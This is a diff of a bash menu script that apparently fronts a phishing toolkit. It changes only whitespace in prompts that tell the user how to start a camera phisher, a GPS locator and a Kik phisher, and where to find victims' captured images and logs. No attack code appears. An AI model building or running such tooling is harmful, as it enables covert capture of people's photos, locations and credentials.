@@ -22,36 +22,36 @@ echo -e "                                                                       
 echo -e "                                                                                                      ${RED}0. Exit${NC}"
 
 # Read user input
-read -p "$(echo -e ${RED}Choose an option: ${NC})" choice
+read -p "                                                                                                      $(echo -e ${RED}Choose an option: ${NC})" choice
 
 # Handle user input
 case $choice in
     1)
         # Display a message and wait for user to press Enter
-        echo -e "                                                                                              ${RED}Start camphisher by saying cd tools/phishers and then bash camphish.sh${NC}"
-        echo -e "                                                                                              ${RED}Find the victims imgs in cd tools/phishers/imgs${NC}"
-        read -p "$(echo -e ${RED}Press [Enter] to return to the menu or exit...${NC})"
+        echo -e "                                                                                                      ${RED}Start camphisher by saying cd tools/phishers and then bash camphish.sh${NC}"
+        echo -e "                                                                                                      ${RED}Find the victims imgs in cd tools/phishers/imgs${NC}"
+        read -p "                                                                                                      $(echo -e ${RED}Press [Enter] to return to the menu or exit...${NC})"
         ;;
     2)
         # Display a message and wait for user to press Enter
-        echo -e "                                                                                              ${RED}Start gps pin pointer by saying cd tools/phishers and then bash gps.sh${NC}"
-        echo -e "                                                                                              ${RED}Find the victims logs in cd tools/phishers/ and then open logs.txt${NC}"
-        read -p "$(echo -e ${RED}Press [Enter] to return to the menu or exit...${NC})"
+        echo -e "                                                                                                      ${RED}Start gps pin pointer by saying cd tools/phishers and then bash gps.sh${NC}"
+        echo -e "                                                                                                      ${RED}Find the victims logs in cd tools/phishers/ and then open logs.txt${NC}"
+        read -p "                                                                                                      $(echo -e ${RED}Press [Enter] to return to the menu or exit...${NC})"
         ;;
     3)
         # Display a message and wait for user to press Enter
-        echo -e "                                                                                              ${RED}Start Kik Phisher by saying cd tools/phishers and then bash kikphish.sh${NC}"
-        echo -e "                                                                                              ${RED}Find the victims logs in cd tools/phishers/ and then open saved.txt${NC}"
-        read -p "$(echo -e ${RED}Press [Enter] to return to the menu or exit...${NC})"
+        echo -e "                                                                                                      ${RED}Start Kik Phisher by saying cd tools/phishers and then bash kikphish.sh${NC}"
+        echo -e "                                                                                                      ${RED}Find the victims logs in cd tools/phishers/ and then open saved.txt${NC}"
+        read -p "                                                                                                      $(echo -e ${RED}Press [Enter] to return to the menu or exit...${NC})"
         ;;
     0)
         # Exit the script
-        echo -e "${RED}Exiting...${NC}"
+        echo -e "                                                                                                      ${RED}Exiting...${NC}"
         exit 0
         ;;
     *)
         # Invalid choice
-        echo -e "${RED}Invalid choice, please enter 1 or 0.${NC}"
+        echo -e "                                                                                                      ${RED}Invalid choice, please enter 1 or 0.${NC}"
         ;;
 esac
 
